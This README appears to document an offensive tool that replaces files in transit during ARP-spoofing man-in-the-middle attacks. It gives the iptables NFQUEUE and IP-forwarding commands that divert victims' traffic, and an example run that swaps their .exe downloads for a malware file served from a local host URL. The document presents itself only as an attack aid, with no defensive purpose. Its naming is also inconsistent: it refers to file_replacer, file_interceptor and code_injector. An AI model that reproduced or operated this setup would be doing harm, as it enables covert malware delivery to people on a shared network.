# File_replacer
It replaces files while downloading, use it with arp-spoofer to perform mitm attacks.

Set iptables and linux ip forwardng rules before using file_replacer:


To set linux ip forwarding to true:


echo 1 > /proc/sys/net/ipv4/ip_forward


or


sysctl -w net.ipv4.ip_forward=1

⚠️ Set false or 0 after using code_injector


echo 0 > /proc/sys/net/ipv4/ip_forward


or


sysctl -w net.ipv4.ip_forward=0


To set iptables rule:


iptables -I FORWARD -j NFQUEUE --queue-num 0



⚠️ flush iptables rule after using code_injector


iptables --flush

Usage: file_interceptor.py [options]

Options:
  -h, --help            show this help message and exit
  -m MALACIOUSFILE, --malacious-file=MALACIOUSFILE
                        Enter Malacious file url (eg: -mf
                        http://192.168.1.11/malware.exe
  -f FILETYPE, --file-type=FILETYPE
                        Add file type which you want to replece on download
                        (Eg: -f exe

![Screenshot 2023-01-03 115007](https://user-images.githubusercontent.com/109381227/210309124-287f9e27-1b69-4b75-8cb4-eebc0537fbd3.jpg)

Example: python3 file_interceptor.py -m http://192.168.1.11/bad.exe -f exe

![Screenshot 2023-01-03 115248](https://user-images.githubusercontent.com/109381227/210309176-ef173376-6fa6-4a71-81c1-f6a6b997f160.jpg)

